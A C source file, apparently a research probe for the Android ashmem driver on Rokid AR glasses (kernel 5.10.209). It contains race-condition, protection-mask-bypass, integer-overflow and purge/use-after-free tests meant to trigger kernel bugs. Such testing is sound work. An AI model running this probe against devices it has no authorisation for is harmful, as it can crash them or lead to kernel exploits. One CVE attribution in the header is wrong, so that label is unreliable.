/*
 * ashmem_probe.c - Ashmem Driver Vulnerability Probe
 *
 * Target: Rokid AR Glasses (Kernel 5.10.209)
 * /dev/ashmem is world-writable (accessible)
 *
 * Known Ashmem CVEs to test:
 * - CVE-2021-0703: Ashmem race condition in mmap
 * - CVE-2020-0069: Ashmem use-after-free
 * - CVE-2016-5195 variants: Dirty COW on shared memory
 *
 * Compile:
 * $NDK = "C:\Users\<USER>\AppData\Local\Android\Sdk\ndk\29.0.14206865"
 * $CC = "$NDK\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android31-clang.cmd"
 * & $CC -static -O2 -pthread -o ashmem_probe ashmem_probe.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <pthread.h>
#include <linux/ashmem.h>

#ifndef ASHMEM_SET_NAME
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
#endif
#ifndef ASHMEM_GET_NAME
#define ASHMEM_GET_NAME _IOR(__ASHMEMIOC, 2, char[ASHMEM_NAME_LEN])
#endif
#ifndef ASHMEM_SET_SIZE
#define ASHMEM_SET_SIZE _IOW(__ASHMEMIOC, 3, size_t)
#endif
#ifndef ASHMEM_GET_SIZE
#define ASHMEM_GET_SIZE _IO(__ASHMEMIOC, 4)
#endif
#ifndef ASHMEM_SET_PROT_MASK
#define ASHMEM_SET_PROT_MASK _IOW(__ASHMEMIOC, 5, unsigned long)
#endif
#ifndef ASHMEM_GET_PROT_MASK
#define ASHMEM_GET_PROT_MASK _IO(__ASHMEMIOC, 6)
#endif
#ifndef ASHMEM_PIN
#define ASHMEM_PIN _IOW(__ASHMEMIOC, 7, struct ashmem_pin)
#endif
#ifndef ASHMEM_UNPIN
#define ASHMEM_UNPIN _IOW(__ASHMEMIOC, 8, struct ashmem_pin)
#endif
#ifndef ASHMEM_GET_PIN_STATUS
#define ASHMEM_GET_PIN_STATUS _IO(__ASHMEMIOC, 9)
#endif
#ifndef ASHMEM_PURGE_ALL_CACHES
#define ASHMEM_PURGE_ALL_CACHES _IO(__ASHMEMIOC, 10)
#endif

#ifndef __ASHMEMIOC
#define __ASHMEMIOC 0x77
#endif

#ifndef ASHMEM_NAME_LEN
#define ASHMEM_NAME_LEN 256
#endif

#ifndef ASHMEM_NAME_DEF
#define ASHMEM_NAME_DEF "dev/ashmem"
#endif

#ifndef ASHMEM_NOT_PURGED
#define ASHMEM_NOT_PURGED 0
#endif

#ifndef ASHMEM_WAS_PURGED
#define ASHMEM_WAS_PURGED 1
#endif

#ifndef ASHMEM_IS_UNPINNED
#define ASHMEM_IS_UNPINNED 2
#endif

#ifndef ASHMEM_IS_PINNED
#define ASHMEM_IS_PINNED 3
#endif

// struct ashmem_pin is defined in <linux/ashmem.h>

#define PAGE_SIZE 4096
#define RACE_THREADS 8
#define RACE_ITERATIONS 10000

static volatile int race_go = 0;
static volatile int race_done = 0;
static int race_fd = -1;
static void *race_map = NULL;
static size_t race_size = PAGE_SIZE * 16;

// Test 1: Basic functionality probe
int test_basic_ashmem(void)
{
    printf("\n[TEST 1] Basic Ashmem Functionality\n");
    printf("="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "\n");

    int fd = open("/dev/ashmem", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Cannot open /dev/ashmem: %s\n", strerror(errno));
        return -1;
    }
    printf("[+] Opened /dev/ashmem fd=%d\n", fd);

    // Set name
    char name[ASHMEM_NAME_LEN] = "test_region";
    int ret = ioctl(fd, ASHMEM_SET_NAME, name);
    printf("[*] ASHMEM_SET_NAME: %s\n", ret == 0 ? "OK" : strerror(errno));

    // Get name
    char get_name[ASHMEM_NAME_LEN] = {0};
    ret = ioctl(fd, ASHMEM_GET_NAME, get_name);
    if (ret >= 0)
    {
        printf("[+] ASHMEM_GET_NAME: '%s'\n", get_name);
    }

    // Set size
    size_t size = PAGE_SIZE * 4;
    ret = ioctl(fd, ASHMEM_SET_SIZE, size);
    printf("[*] ASHMEM_SET_SIZE(%zu): %s\n", size, ret == 0 ? "OK" : strerror(errno));

    // Get size
    ret = ioctl(fd, ASHMEM_GET_SIZE);
    printf("[*] ASHMEM_GET_SIZE: %d bytes\n", ret);

    // Get prot mask
    ret = ioctl(fd, ASHMEM_GET_PROT_MASK);
    printf("[*] ASHMEM_GET_PROT_MASK: 0x%x\n", ret);

    // mmap
    void *map = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED)
    {
        printf("[-] mmap failed: %s\n", strerror(errno));
        close(fd);
        return -1;
    }
    printf("[+] mmap OK: %p\n", map);

    // Write/Read test
    memset(map, 0x41, size);
    printf("[+] Write 0x41 to entire region: OK\n");

    // Pin region
    struct ashmem_pin pin = {.offset = 0, .len = size};
    ret = ioctl(fd, ASHMEM_PIN, &pin);
    printf("[*] ASHMEM_PIN: %d\n", ret);

    // Get pin status
    ret = ioctl(fd, ASHMEM_GET_PIN_STATUS);
    printf("[*] ASHMEM_GET_PIN_STATUS: %d (%s)\n", ret,
           ret == ASHMEM_IS_PINNED ? "PINNED" : ret == ASHMEM_IS_UNPINNED ? "UNPINNED"
                                                                          : "UNKNOWN");

    // Unpin
    ret = ioctl(fd, ASHMEM_UNPIN, &pin);
    printf("[*] ASHMEM_UNPIN: %d\n", ret);

    // Check purge capability
    ret = ioctl(fd, ASHMEM_PURGE_ALL_CACHES);
    printf("[*] ASHMEM_PURGE_ALL_CACHES: %s\n", ret == 0 ? "OK" : strerror(errno));

    munmap(map, size);
    close(fd);

    printf("[+] Basic functionality: PASS\n");
    return 0;
}

// Test 2: Protection mask bypass attempt
int test_prot_mask_bypass(void)
{
    printf("\n[TEST 2] Protection Mask Bypass\n");
    printf("="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "\n");

    int fd = open("/dev/ashmem", O_RDWR);
    if (fd < 0)
        return -1;

    ioctl(fd, ASHMEM_SET_NAME, "prot_test");
    ioctl(fd, ASHMEM_SET_SIZE, PAGE_SIZE);

    // Set read-only prot mask
    unsigned long prot_mask = PROT_READ;
    int ret = ioctl(fd, ASHMEM_SET_PROT_MASK, prot_mask);
    printf("[*] Set PROT_READ only mask: %s\n", ret == 0 ? "OK" : strerror(errno));

    // Try to mmap with PROT_WRITE
    void *map = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED)
    {
        printf("[+] PROT_WRITE blocked as expected: %s\n", strerror(errno));
    }
    else
    {
        printf("[!] BUG: PROT_WRITE allowed despite PROT_READ mask!\n");

        // Try to write
        ((char *)map)[0] = 'X';
        printf("[!] Write succeeded - SECURITY VULNERABILITY!\n");
        munmap(map, PAGE_SIZE);
    }

    // Try to upgrade prot mask back to RW
    prot_mask = PROT_READ | PROT_WRITE;
    ret = ioctl(fd, ASHMEM_SET_PROT_MASK, prot_mask);
    if (ret == 0)
    {
        printf("[!] BUG: Prot mask upgrade allowed!\n");
    }
    else
    {
        printf("[+] Prot mask upgrade blocked: %s\n", strerror(errno));
    }

    close(fd);
    return 0;
}

// Test 3: Race condition - mmap vs close
static void *race_mmap_thread(void *arg)
{
    (void)arg;
    while (!race_done)
    {
        while (!race_go && !race_done)
        {
            usleep(1);
        }
        if (race_done)
            break;

        void *map = mmap(NULL, race_size, PROT_READ | PROT_WRITE, MAP_SHARED, race_fd, 0);
        if (map != MAP_FAILED)
        {
            // Quick access to trigger any UAF
            volatile char c = ((char *)map)[0];
            (void)c;
            munmap(map, race_size);
        }
    }
    return NULL;
}

static void *race_close_thread(void *arg)
{
    (void)arg;
    while (!race_done)
    {
        while (!race_go && !race_done)
        {
            usleep(1);
        }
        if (race_done)
            break;

        // Race: close during mmap
        if (race_fd >= 0)
        {
            close(race_fd);
            race_fd = -1;
        }
    }
    return NULL;
}

int test_mmap_close_race(void)
{
    printf("\n[TEST 3] mmap/close Race Condition (CVE-2021-0703 style)\n");
    printf("="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "\n");

    pthread_t mmap_threads[RACE_THREADS];
    pthread_t close_thread;

    for (int i = 0; i < RACE_THREADS; i++)
    {
        pthread_create(&mmap_threads[i], NULL, race_mmap_thread, NULL);
    }
    pthread_create(&close_thread, NULL, race_close_thread, NULL);

    printf("[*] Racing mmap vs close for %d iterations...\n", RACE_ITERATIONS);

    for (int i = 0; i < RACE_ITERATIONS; i++)
    {
        // Create new ashmem region
        race_fd = open("/dev/ashmem", O_RDWR);
        if (race_fd < 0)
            continue;

        ioctl(race_fd, ASHMEM_SET_NAME, "race_test");
        ioctl(race_fd, ASHMEM_SET_SIZE, race_size);

        // Signal race start
        race_go = 1;
        usleep(10);
        race_go = 0;

        // Cleanup any leftover fd
        if (race_fd >= 0)
        {
            close(race_fd);
            race_fd = -1;
        }

        if (i % 1000 == 0)
        {
            printf("[*] Iteration %d/%d\n", i, RACE_ITERATIONS);
        }
    }

    race_done = 1;
    race_go = 1;

    for (int i = 0; i < RACE_THREADS; i++)
    {
        pthread_join(mmap_threads[i], NULL);
    }
    pthread_join(close_thread, NULL);

    printf("[*] Race complete - check dmesg for any crashes\n");
    return 0;
}

// Test 4: Pin/Unpin race
static int pin_fd = -1;
static volatile int pin_race_done = 0;

static void *pin_thread(void *arg)
{
    (void)arg;
    struct ashmem_pin pin = {.offset = 0, .len = PAGE_SIZE * 4};

    while (!pin_race_done)
    {
        if (pin_fd >= 0)
        {
            ioctl(pin_fd, ASHMEM_PIN, &pin);
        }
    }
    return NULL;
}

static void *unpin_thread(void *arg)
{
    (void)arg;
    struct ashmem_pin unpin = {.offset = 0, .len = PAGE_SIZE * 4};

    while (!pin_race_done)
    {
        if (pin_fd >= 0)
        {
            ioctl(pin_fd, ASHMEM_UNPIN, &unpin);
        }
    }
    return NULL;
}

static void *access_thread(void *arg)
{
    void *map = arg;

    while (!pin_race_done)
    {
        if (map)
        {
            volatile char c = ((char *)map)[0];
            ((char *)map)[0] = c + 1;
        }
    }
    return NULL;
}

int test_pin_unpin_race(void)
{
    printf("\n[TEST 4] Pin/Unpin Race Condition\n");
    printf("="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "\n");

    size_t size = PAGE_SIZE * 4;

    pin_fd = open("/dev/ashmem", O_RDWR);
    if (pin_fd < 0)
        return -1;

    ioctl(pin_fd, ASHMEM_SET_NAME, "pin_race");
    ioctl(pin_fd, ASHMEM_SET_SIZE, size);

    void *map = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, pin_fd, 0);
    if (map == MAP_FAILED)
    {
        close(pin_fd);
        return -1;
    }

    pthread_t threads[6];
    pthread_create(&threads[0], NULL, pin_thread, NULL);
    pthread_create(&threads[1], NULL, pin_thread, NULL);
    pthread_create(&threads[2], NULL, unpin_thread, NULL);
    pthread_create(&threads[3], NULL, unpin_thread, NULL);
    pthread_create(&threads[4], NULL, access_thread, map);
    pthread_create(&threads[5], NULL, access_thread, map);

    printf("[*] Racing pin/unpin/access for 5 seconds...\n");
    sleep(5);

    pin_race_done = 1;

    for (int i = 0; i < 6; i++)
    {
        pthread_join(threads[i], NULL);
    }

    munmap(map, size);
    close(pin_fd);

    printf("[*] Pin/Unpin race complete - check dmesg\n");
    return 0;
}

// Test 5: Memory pressure + unpin to trigger purge
int test_memory_pressure_purge(void)
{
    printf("\n[TEST 5] Memory Pressure + Purge Test\n");
    printf("="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "\n");

#define NUM_REGIONS 100
    int fds[NUM_REGIONS];
    void *maps[NUM_REGIONS];
    size_t size = PAGE_SIZE * 64; // 256KB per region

    printf("[*] Creating %d unpinned ashmem regions (%zu KB total)...\n",
           NUM_REGIONS, (NUM_REGIONS * size) / 1024);

    for (int i = 0; i < NUM_REGIONS; i++)
    {
        fds[i] = open("/dev/ashmem", O_RDWR);
        if (fds[i] < 0)
        {
            printf("[-] Failed at region %d\n", i);
            break;
        }

        char name[32];
        snprintf(name, sizeof(name), "pressure_%d", i);
        ioctl(fds[i], ASHMEM_SET_NAME, name);
        ioctl(fds[i], ASHMEM_SET_SIZE, size);

        maps[i] = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fds[i], 0);
        if (maps[i] != MAP_FAILED)
        {
            memset(maps[i], 0x42 + i, size);

            // Unpin to make purgeable
            struct ashmem_pin unpin = {.offset = 0, .len = size};
            ioctl(fds[i], ASHMEM_UNPIN, &unpin);
        }
    }

    printf("[*] Triggering global purge...\n");
    int fd = open("/dev/ashmem", O_RDWR);
    if (fd >= 0)
    {
        int ret = ioctl(fd, ASHMEM_PURGE_ALL_CACHES);
        printf("[*] PURGE_ALL_CACHES returned: %d\n", ret);
        close(fd);
    }

    printf("[*] Checking for UAF after purge...\n");
    int uaf_detected = 0;
    for (int i = 0; i < NUM_REGIONS; i++)
    {
        if (maps[i] != MAP_FAILED)
        {
            // Re-pin and access
            struct ashmem_pin pin = {.offset = 0, .len = size};
            int status = ioctl(fds[i], ASHMEM_PIN, &pin);

            if (status == ASHMEM_WAS_PURGED)
            {
                printf("[*] Region %d was purged\n", i);
                // Accessing purged memory could trigger issues
                volatile char c = ((char *)maps[i])[0];
                if (c != (char)(0x42 + i))
                {
                    printf("[!] Region %d data changed after purge!\n", i);
                    uaf_detected++;
                }
            }

            munmap(maps[i], size);
        }
        close(fds[i]);
    }

    if (uaf_detected > 0)
    {
        printf("[!] Potential UAF: %d regions had unexpected data\n", uaf_detected);
    }

    return 0;
}

// Test 6: Large allocation stress
int test_large_allocation_stress(void)
{
    printf("\n[TEST 6] Large Allocation Stress Test\n");
    printf("="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "\n");

    // Try progressively larger sizes
    size_t sizes[] = {
        1024 * 1024,       // 1MB
        4 * 1024 * 1024,   // 4MB
        16 * 1024 * 1024,  // 16MB
        64 * 1024 * 1024,  // 64MB
        256 * 1024 * 1024, // 256MB
    };

    for (int i = 0; i < sizeof(sizes) / sizeof(sizes[0]); i++)
    {
        int fd = open("/dev/ashmem", O_RDWR);
        if (fd < 0)
            continue;

        ioctl(fd, ASHMEM_SET_NAME, "large_test");
        int ret = ioctl(fd, ASHMEM_SET_SIZE, sizes[i]);

        printf("[*] Size %zu MB: SET_SIZE %s",
               sizes[i] / (1024 * 1024),
               ret == 0 ? "OK" : "FAIL");

        if (ret == 0)
        {
            void *map = mmap(NULL, sizes[i], PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
            if (map != MAP_FAILED)
            {
                // Touch first and last page
                ((char *)map)[0] = 'A';
                ((char *)map)[sizes[i] - 1] = 'Z';
                printf(", mmap OK, access OK\n");
                munmap(map, sizes[i]);
            }
            else
            {
                printf(", mmap FAIL: %s\n", strerror(errno));
            }
        }
        else
        {
            printf(" (%s)\n", strerror(errno));
        }

        close(fd);
    }

    return 0;
}

// Test 7: Integer overflow in size/offset
int test_integer_overflow(void)
{
    printf("\n[TEST 7] Integer Overflow Tests\n");
    printf("="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "\n");

    int fd = open("/dev/ashmem", O_RDWR);
    if (fd < 0)
        return -1;

    ioctl(fd, ASHMEM_SET_NAME, "overflow_test");

    // Test overflow sizes
    size_t overflow_sizes[] = {
        (size_t)-1,
        (size_t)-PAGE_SIZE,
        0x7FFFFFFFFFFFFFFF,
        0x8000000000000000,
        0xFFFFFFFFFFFFFFFF - PAGE_SIZE + 1,
    };

    for (int i = 0; i < sizeof(overflow_sizes) / sizeof(overflow_sizes[0]); i++)
    {
        int ret = ioctl(fd, ASHMEM_SET_SIZE, overflow_sizes[i]);
        printf("[*] Size 0x%lx: %s\n",
               (unsigned long)overflow_sizes[i],
               ret == 0 ? "ACCEPTED (suspicious!)" : strerror(errno));
    }

    // Set valid size, test overflow in pin
    ioctl(fd, ASHMEM_SET_SIZE, PAGE_SIZE * 4);

    struct ashmem_pin overflow_pins[] = {
        {.offset = 0xFFFFFFFF, .len = PAGE_SIZE},
        {.offset = 0, .len = 0xFFFFFFFF},
        {.offset = 0x80000000, .len = 0x80000000},
    };

    printf("\n[*] Testing pin offset/len overflow:\n");
    for (int i = 0; i < sizeof(overflow_pins) / sizeof(overflow_pins[0]); i++)
    {
        int ret = ioctl(fd, ASHMEM_PIN, &overflow_pins[i]);
        printf("[*] offset=0x%x len=0x%x: %s\n",
               overflow_pins[i].offset, overflow_pins[i].len,
               ret >= 0 ? "ACCEPTED" : strerror(errno));
    }

    close(fd);
    return 0;
}

int main(int argc, char *argv[])
{
    printf("========================================\n");
    printf("    Ashmem Vulnerability Probe v1.0    \n");
    printf("    Target: Kernel 5.10.209            \n");
    printf("========================================\n");

    printf("\n[*] Device: /dev/ashmem\n");
    printf("[*] PID: %d\n", getpid());
    printf("[*] UID: %d\n", getuid());

    // Check device access
    if (access("/dev/ashmem", R_OK | W_OK) != 0)
    {
        printf("[-] Cannot access /dev/ashmem\n");
        return 1;
    }
    printf("[+] /dev/ashmem accessible\n");

    // Run all tests
    test_basic_ashmem();
    test_prot_mask_bypass();
    test_integer_overflow();
    test_large_allocation_stress();
    test_memory_pressure_purge();

    if (argc > 1 && strcmp(argv[1], "--race") == 0)
    {
        test_mmap_close_race();
        test_pin_unpin_race();
    }
    else
    {
        printf("\n[*] Run with --race to execute race condition tests\n");
    }

    printf("\n========================================\n");
    printf("    Probe Complete                      \n");
    printf("    Check 'dmesg' for kernel messages   \n");
    printf("========================================\n");

    return 0;
}
